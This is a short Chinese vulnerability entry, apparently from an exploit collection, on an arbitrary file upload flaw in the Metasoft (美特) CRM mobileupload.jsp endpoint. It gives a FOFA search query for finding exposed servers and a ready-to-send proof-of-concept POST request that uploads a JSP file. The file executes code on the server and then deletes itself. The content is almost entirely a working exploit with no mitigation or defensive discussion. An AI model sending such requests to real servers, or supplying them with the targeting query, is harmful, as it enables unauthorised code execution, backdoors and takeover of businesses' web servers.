## 美特CRM-mobileupload.jsp-任意文件上传漏洞

## 一、漏洞简介
美特CRM mobileupload.jsp 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```
body="/common/scripts/basic.js"
```

## poc
```
POST /mobile/mobileupload.jsp HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123456

------WebKitFormBoundary123456
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary123456--
```
